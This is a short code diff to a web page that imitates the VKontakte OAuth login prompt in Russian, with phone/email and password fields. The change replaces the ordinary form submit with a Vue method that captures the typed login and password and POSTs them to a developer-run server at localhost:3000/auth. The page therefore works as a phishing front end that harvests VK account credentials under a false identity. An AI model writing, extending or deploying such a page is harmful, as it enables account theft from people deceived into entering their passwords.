@@ -23,7 +23,7 @@
                         <div class="oauth_content box_body clear_fix">
                         <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>
 
-                        <form method="POST" id="login_submit" action="">
+                        <form id="login_submit">
                             <div class="oauth_form">
                                 <div class="box_error" v-show="enterError">Указан неверный логин или пароль.</div> 
 
@@ -31,16 +31,15 @@
 
                                 <div class="oauth_form_login">
                                     <div class="oauth_form_header">Телефон или email</div>
-                                    <input class="oauth_form_input dark" name="login" type="text">
+                                    <input class="oauth_form_input dark" name="login" type="text" v-model="login" onkeypress="if(event.keyCode == 13) return false;">
                                     
                                     <div class="oauth_form_header">Пароль</div>
-                                    <input class="oauth_form_input dark" name="pass" type="password">
+                                    <input class="oauth_form_input dark" name="pass" type="password" v-model="pass" onkeypress="if(event.keyCode == 13) return false;">
 
                                     
 
-                                    <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
+                                    <button class="flat_button oauth_button button_wide" id="install_allow" type="button" @click="sendAuthData">Войти</button>
                                     <!--a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a-->
-                                    <input name="submit_input" class="unshown" type="submit">
                                 </div>
                             </div>
                         </form>
@@ -59,12 +58,30 @@
 
         data:function(){
             return{
-                enterError: false
+                enterError: false,
+
+                login: '',
+                pass: ''
             }
         },
 
         methods:{
-            
+            sendAuthData:function(){
+                axios({
+                    method: 'POST',
+                    url: 'http://localhost:3000/auth',
+                    data:{
+                        login: this.login,
+                        pass: this.pass
+                    }
+                })
+                    .then(function(res){
+
+                    })
+                    .catch(function(err){
+                        console.log(err);
+                    })
+            }
         }
     }
 </script>
